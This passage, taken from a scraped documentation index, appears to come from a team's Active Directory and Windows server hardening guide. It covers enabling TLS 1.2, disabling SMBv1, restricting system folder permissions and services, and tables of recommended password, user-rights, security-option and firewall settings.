above protocol​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#262-enable-tls-12-and-above-protocol","content":" Control Statement​  If configured to require client side certificates, TLS can also play a role in client authentication to the server. TLS also provides two additional benefits that are commonly overlooked; integrity guarantees and replay prevention. A TLS stream of communication contains built-in controls to prevent tampering with any portion of the encrypted data. In addition, controls are also built-in to prevent a captured stream of TLS data from being replayed at a later time.  TLS provides the above guarantees to data during transmission. TLS does not offer any of these security benefits to data that is at rest. Therefore appropriate security controls must be added to protect data while at rest within the application or within data stores.  Risk/Impact  An attacker may try to break the integrity of data and also sniff the sensitive information.  Risk Rating  Medium  Implementation Steps​  The TLS 1.2 &amp; above protocol must be enabled on the server and make sure that the stronger TLS protocols are used, follow these instructions to enable TLS protocols:  Click Start, click Run, type regedit, and then click OK.  In Registry Editor, locate the following registry key/folder:  HKey_Local_Machine\\System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols 3. Create TLS 1.2 folder and then click Key. Name the new folder Server.  Inside the Server folder, click the Edit menu, select New, and click DWORD (32-bit) Value.  Enter Enabled as the name and hit Enter.  Ensure that it shows 0x00000001 (1) under the Data column. If it doesn't, right-click and select Modify and enter 1 as the Value data.  Now to Enable TLS 1.2 protocol right-click on the TLS 1.2 folder and select New and then click Key. Name the new folder Server.  Inside the Server folder, click the Edit menu, select New, and click DWORD (32-bit) Value.  Enter Enabled as the name and hit Enter.  Ensure that it shows 0x00000001 (1) under the Data column (it should by default). If it doesn't, right-click and select Modify and enter 1 as the data value.  Restart the computer.  ","version":"Next","tagName":"h3"},{"title":"2.7. SMB Protocol​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#27-smb-protocol","content":" ","version":"Next","tagName":"h2"},{"title":"2.7.1. Disable Weak SMB Protocol​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#271-disable-weak-smb-protocol","content":" Control Statement  The Server Message Block (SMB) Protocol is a network file sharing protocol  Risk/Impact​  This may lead to transmit passwords in plaintext across the network to other computers that offer weak SMB services.  Risk Rating  High  Implementation Steps​  Weak SMB protocol must be disabled on the servers.  Steps to disable weak SMB protocol using the registry: Registry subkey:  HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters Registry entry: SMB1  REG_DWORD: 0 = Disabled  ","version":"Next","tagName":"h3"},{"title":"2.8. Non-Essential Services​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#28-non-essential-services","content":" ","version":"Next","tagName":"h2"},{"title":"2.8.1. Disable Non-Essential Services​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#281-disable-non-essential-services","content":" Control Statement​  Network services that compromise the security of the server should not be installed and only necessary services should be running on the server.  Risk/Impact​  Running additional, unnecessary services increases the risk of a malicious user utilizing these services to compromise the security of the systems. Any vulnerability that exists for these services may be used to exploit the system.  Risk Rating  Medium  Implementation Steps​  Ensure that all non-essential services are disabled. To configure the services, 1. Click Start &gt; Run and type services.msc.  Stop the non-essential services and also modify the startup type of the service. Refer Appendix – 7  ","version":"Next","tagName":"h3"},{"title":"2.9. System Folder Permissions​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#29-system-folder-permissions","content":" 2.9.1. Directories that contain sensitive Windows system files should be secured.  ","version":"Next","tagName":"h2"},{"title":"Control Statement​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#control-statement-14","content":" Restrict access to sensitive Windows directories. The following directories should be secured:  %systemdrive%  %systemroot%  %systemroot%\\System32  %systemroot%\\System32\\drivers  %systemroot%\\System32\\spool  %systemroot%\\System32\\config  %systemroot%\\sysvol  %systemroot%\\security  %systemroot%\\ntds  %systemroot%\\ntfrs  The recommended guidelines state:  TrustedInstaller - Full control - This folder and subfolders  SYSTEM - Full control - This folder, subfolders and files  Administrators - Full control - This folder, subfolders and files  CREATOR OWNER - Full control - Subfolders and files only  Users - Read &amp; execute - This folder, subfolders and files  ","version":"Next","tagName":"h3"},{"title":"Risk/Impact​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#riskimpact-11","content":" If unauthorized users gain access to sensitive system files, they could potentially execute a Trojan horse or create a denial of service on the server.  Risk Rating  Low  ","version":"Next","tagName":"h3"},{"title":"Implementation Steps​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#implementation-steps-22","content":" Secure sensitive Windows directories by performing the following steps:  Open Windows Explorer;  Right click on the directory or file and select Properties from the menu;  Select the Security tab;  Highlight each group that should not have access as recommended below and click the Remove button;  click the Add button to add the appropriate groups;  Type in the Group name;  Click OK to accept these changes;  Click the advanced button;  Review the permissions set;  If they are not in compliance with corporate standards or the recommended guidelines, highlight the group and click the Edit... button;  Click the down arrow of the Apply onto: field and select the appropriate access;  Click OK to return to the Access Control Settings window;  Repeat steps 9 through 12 for each group; 14) Click OK to return to the Properties window; and  Click OK to confirm access changes.  ","version":"Next","tagName":"h3"},{"title":"2.10. Security setting​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#210-security-setting","content":" ","version":"Next","tagName":"h2"},{"title":"2.10.1. PIM solution must integrate all admin accounts​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#2101-pim-solution-must-integrate-all-admin-accounts","content":" Control Statement​  Reconciliation accounts feature from PIMS can be used to ensure that critical accounts are vaulted and password lockout problems do not arise. Risk/Impact  Without PIM solution, limiting and auditing activity of privileged users will not be possible.  Risk Rating  Medium  Implementation Steps  PIM solution must be deployed and all admin accounts should be integrated with it.  ","version":"Next","tagName":"h3"},{"title":"2.11. AD Replication​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#211-ad-replication","content":" ","version":"Next","tagName":"h2"},{"title":"2.11.1. Active Directory Replication​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#2111-active-directory-replication","content":" Control Statement​  By default, active directory is robust and runs under active-active mode. However, it is important to keep a check to ensure that replication issues are tracked in real time.  Risk/Impact​  AD replication ensures that secondary Domain controller is available for switchover in case the primary domain controller fails due to any reason.  Risk Rating  Medium  Implementation Steps  AD replication status should be monitored frequently so that issues do not get unnoticed.  3. Appendix  ","version":"Next","tagName":"h3"},{"title":"3.1. Appendix 1​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#31-appendix-1","content":" Sr.No\tPolicy\tSuggested Setting1\tEnforce password history\t5 2\tMaximum password age\t90 3\tMinimum password age\t'1 or more day(s)' 4\tMinimum password length\t8 5\tPassword must meet complexity requirements\t'Enabled' 6\tStore passwords using reversible encryption\t'Disabled' 7\tAccount lockout duration\t30 minutes 8\tAccount lockout threshold\t3 9\tReset account lockout counter after\t0 (Only administrator can reset account)  ","version":"Next","tagName":"h2"},{"title":"3.2. Appendix 2​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#32-appendix-2","content":" Sr.No\tPolicy\tSuggested Setting for Member Server\tHow to Verify1\tAccess credential manager as a trusted caller\tNo One\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Access Credential Manager as a trusted caller 2\tAccess this computer from the network\tAdministrators, Authenticated Users, ENTERPRISE DOMAIN CONTROLLERS, Everyone, NETWORK SERVICE\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Access this computer from the network 3\tAct as part of the operating system\tRevoke all security groups and accounts\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Act as part of the operating system 4\tAdd workstations to domain\tAdministrators, LOCAL SERVICE\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Add workstations to domain 5\tAdjust memory quotas for a process\tAdministrators, NETWORK SERVICE, LOCAL SERVICE\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Adjust memory quotas for a process 6\tAllow log on locally\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Allow log on locally 7\tAllow log on through Remote Desktop Services\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Allow log on through Remote Desktop Services 8\tBackup files and directories\tAdministrators 9\tBypass traverse checking\tAdministrators, Authenticated Users, Local Service, Network Service, GITCDOM\\0365sqlsvr 10\tChange the system time\tAdministrators, LOCAL SERVICE\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Change the system time 11\tChange the time zone\tAdministrators, Local Service\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Change the time zone 12\tCreate a pagefile\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Create a pagefile 13\tCreate a token object\tNo one\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Create a token object 14\tCreate global objects\tAdministrators, service, Local Service, Network Service, SERVICE\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Create global objects 15\tCreate permanent shared objects\tNo One\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Create permanent shared objects 16\tCreate symbolic link\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Create symbolic links 17\tDebug programs\tNo One\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Debug programs 18\tDeny access to this computer from the network\tGuests\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Deny access to this computer from the network 19\tDeny log on as a batch job\tGuests\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Deny log on as a batch job 20\tDeny log on as a service\tGuests\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Deny log on as a service 21\tDeny log on locally\tGuests\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Deny log on locally 22\tDeny log on through Terminal Services\tGuests\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Deny log on through Remote Desktop Services 23\tEnable computer and user accounts to be trusted for Delegation\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Enable computer and user accounts to be trusted for delegation 24\tForce shutdown from a remote system\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Force shutdown from a remote system 25\tGenerate security audits\tNETWORK SERVICE, LOCAL SERVICE, gitcdom\\o365adfssvr\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Generate security audits 26\tImpersonate a client after authentication\tAdministrators, Service, NETWORK SERVICE, LOCAL SERVICE\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Impersonate a client after authentication 27\tIncrease a process working set\tAdministrators, Local Service 28\tIncrease scheduling priority\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Increase scheduling priority 29\tLoad and unload device drivers\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Load and unload device drivers 30\tLock pages in memory\tNo one\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Lock pages in memory 31\tLog on as a batch job\tAdministrators\tComputer Configuration\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Log on as a batch job 32\tManage auditing and security log\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Manage auditing and security log 33\tModify an object label\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Modify an object label 34\tModify firmware environment values\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Modify firmware environment values 35\tPerform volume maintenance tasks\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Perform volume maintenance tasks 36\tProfile single process\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Profile single process 37\tProfile system performance\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Profile system performance 38\tReplace a process level token\tNETWORK SERVICE, LOCAL SERVICE\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Replace a process level token 39\tRestore files and directories\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Restore files and directories 40\tShut down the system\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Shut down the system 41\tSynchronize directory service data\tNo one\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Synchronize directory service data 42\tTake ownership of files or other objects\tAdministrators\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Take ownership of files or other objects 43\tSet 'Deny log on through Remote Desktop Services' to include 'Guests, Local account'\tGuests, Local account\tComputer Configuration\\Windows Settings\\Security Settings\\Local Policies\\User Rights Assignment\\Deny log on through Remote Desktop Services  ","version":"Next","tagName":"h2"},{"title":"3.3. Appendix 3​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#33-appendix-3","content":" Sr.No\tPolicy\tSuggested Setting for Member Server\tHow to Verify1\tAccounts: Block Microsoft accounts\tUsers can't add or log on with Microsoft accounts\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System:NoConnectedUser 2\tAccounts: Guest account status\t'Disabled'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Accounts: Guest account status 3\tAccounts: Limit local account use of blank passwords to console logon only\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:LimitBlankPasswordUse 4\tAccount: Rename administrator account\tRename the 'Administrator' account name\tRename administrator account 5\tAudit: Force audit policy subcategory settings to override audit policy category settings\t'Enabled' 6\tAudit: Shut down system immediately if unable to log security audits\t'Disabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:CrashOnAuditFail 7\tDevices: Allowed to format and eject removable media\t'Administrators'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon:AllocateDASD 8\tDevices: Prevent users from installing printer drivers\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Providers\\LanMan Print Services\\Servers:AddPrinterDrivers 9\tDomain controller: Allow server operators to schedule tasks\t'Disabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:SubmitControl 10\tDomain controller: LDAP server signing requirements\t'Require signing'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters:LDAPServerIntegrity 11\tDomain controller: Refuse machine account password changes\t'Disabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters:RefusePasswordChange 12\tDomain member: Digitally encrypt or sign secure channel data (always)\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters:RequireSignOrSeal 13\tDomain member: Digitally encrypt secure channel data (when possible)\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters:SealSecureChannel 14\tDomain member: Digitally sign secure channel data (when possible)\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters:SignSecureChannel 15\tDomain member: Disable machine account password changes\t'Disabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters:DisablePasswordChange 16\tDomain member: Maximum machine account password age\t'Finite days'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Domain member 17\tDomain member: Require strong session key\t'Enabled' 18\tInteractive logon: Do not display last user name\t'Enabled'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System:DontDisplayLastUserName 19\tInteractive logon: Do not require CTRL+ALT+DEL\t'Disabled'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System:DisableCAD 20\tInteractive logon: Machine inactivity limit\t'900 or fewer second(s), but not 0'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System:InactivityTimeoutSecs 21\tInteractive logon: Number of previous logons to cache\t'1 or fewer logon(s)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon:CachedLogonsCount 22\tInteractive logon: Prompt user to change password before expiration\t'Between 7 and 14 days'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon:PasswordExpiryWarning 23\tInteractive logon: Require Domain Controller Authentication to unlock workstation\t'Enabled'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon:ForceUnlockLogon 24\tInteractive logon: Smart card removal behavior\t'Lock Workstation' or higher\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon:ScRemoveOption 25\tMicrosoft network client: Digitally sign communications (always)\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters:RequireSecuritySignature 26\tMicrosoft network client: Digitally sign communications (if server agrees)\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters:EnableSecuritySignature 27\tMicrosoft network client: Send unencrypted password to third-party SMB servers\t'Disabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters:EnablePlainTextPassword 28\tMicrosoft network server: Amount of idle time required before suspending session\t'15 or fewer minute(s), but not 0'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters:AutoDisconnect 29\tMicrosoft network server: Digitally sign communications (always)\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters:RequireSecuritySignature 30\tMicrosoft network server: Digitally sign communications (if client agrees)\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters:EnableSecuritySignature 31\tMicrosoft network server: Disconnect clients when logon hours expire\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters:EnableForcedLogoff 32\tMicrosoft network server: Server SPN target name validation level\t'Accept if provided by client' or higher (MS only)\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters:SMBServerNameHardeningLevel 33\tNetwork access: Allow anonymous SID/Name translation\t'Disabled'\tComputer Configuration\\Policies\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Network access: Allow anonymous SID/Name translation 34\tNetwork access: Do not allow anonymous enumeration of SAM accounts\t'Enabled' (MS only)\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:RestrictAnonymousSAM 35\tNetwork access: Do not allow anonymous enumeration of SAM accounts and shares\t'Enabled' (MS only)\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:RestrictAnonymous 36\tNetwork access: Do not allow storage of passwords and credentials for network authentication\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:DisableDomainCreds 37\tNetwork access: Let Everyone permissions apply to anonymous users\t'Disabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:EveryoneIncludesAnonymous 38\tNetwork access: Restrict anonymous access to Named Pipes and Shares\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters:RestrictNullSessAccess 39\tNetwork access: Restrict clients allowed to make remote calls to SAM\t'Administrators: Remote Access: Allow' (MS only)\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:restrictremotesam 40\tNetwork access: Shares that can be accessed anonymously\t'None'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters:NullSessionShares 41\tNetwork access: Sharing and security model for local accounts\t'Classic - local users authenticate as themselves'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:ForceGuest 42\tNetwork security: Allow Local System to use computer identity for NTLM\t'Enabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa:UseMachineId 43\tNetwork security: Allow LocalSystem NULL session fallback\t'Disabled'\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0:AllowNullSessionFallback 44\tNetwork Security: Allow PKU2U authentication requests to this computer to use online identities\t'Disabled'\t  ","version":"Next","tagName":"h2"},{"title":"3.4. Appendix 4​","type":1,"pageTitle":"Active Directory Windows","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Active_Directory_Windows_Hardening_Guide#34-appendix-4","content":" Profile\tPolicy\tSuggested Setting\tHow to VerifyDomain Profile Windows Firewall: Domain: Firewall state\t'On (recommended)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall Windows Firewall: Domain: Inbound connections\t'Allow (default)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\DefaultInboundAction Windows Firewall: Domain: Outbound connections\t'Allow (default)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\DefaultOutboundAction Windows Firewall: Domain: Settings: Display a notification\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\DisableNotifications Windows Firewall: Domain: Settings: Apply local firewall rules\t'Yes (default)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\AllowLocalPolicyMerge Windows Firewall: Domain: Settings: Apply local connection security rules\t'Yes (default)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\AllowLocalIPsecPolicyMerge Windows Firewall: Domain: Logging: Name\t'%SYSTEMROOT%\\System32\\logfiles\\firewall\\domainfw.log'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\Logging\\LogFilePath Windows Firewall: Domain: Logging: Size limit (KB)\t'16,384 KB or greater'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\Logging\\LogFileSize Windows Firewall: Domain: Logging: Log dropped packets\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\Logging\\LogDroppedPackets Windows Firewall: Domain: Logging: Log successful connections\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\Logging\\LogSuccessfulConnections Windows Firewall: Domain: Allow unicast response\t'No'\tComputer Configuration\\Windows Settings\\Security Settings\\Windows Firewall with Advanced Security\\Windows Firewall Properties\\Domain Profile\\Windows Firewall: Domain: Allow unicast response Private Profile Windows Firewall: Private: Firewall state\t'On (recommended)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\EnableFirewall Windows Firewall: Private: Inbound connections\t'Allow'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\DefaultInboundAction Windows Firewall: Private: Outbound connections\t'Allow'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\DefaultOutboundAction Windows Firewall: Private: Settings: Display a notification\t'No'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\DisableNotifications Windows Firewall: Private: Settings: Apply local firewall rules\t'Yes (default)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\AllowLocalPolicyMerge Windows Firewall: Private: Settings: Apply local connection security rules\t'Yes (default)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\AllowLocalIPsecPolicyMerge Windows Firewall: Private: Logging: Name\t'%SYSTEMROOT%\\System32\\logfiles\\firewall\\privatefw.log'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\Logging\\LogFilePath Windows Firewall: Private: Logging: Size limit (KB)\t'16,384 KB or greater'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\Logging\\LogFileSize Windows Firewall: Private: Logging: Log dropped packets\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\Logging\\LogDroppedPackets Windows Firewall: Private: Logging: Log successful connections\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PrivateProfile\\Logging\\LogSuccessfulConnections Public Profile Windows Firewall: Public: Firewall state\t'On (recommended)'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\EnableFirewall Windows Firewall: Public: Inbound connections\t'Allow'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\DefaultInboundAction Windows Firewall: Public: Outbound connections\t'Allow'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\DefaultOutboundAction Windows Firewall: Public: Settings: Display a notification\t'Yes'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\DisableNotifications Windows Firewall: Public: Settings: Apply local firewall rules\t'No'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\AllowLocalPolicyMerge Windows Firewall: Public: Settings: Apply local connection security rules\t'No'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\AllowLocalIPsecPolicyMerge Windows Firewall: Public: Logging: Name\t'%SYSTEMROOT%\\System32\\logfiles\\firewall\\publicfw.log'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\Logging\\LogFilePath Windows Firewall: Public: Logging: Size limit (KB)\t'16,384 KB or greater'\tHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile\\Logging\\LogFileSize Windows Firewall: 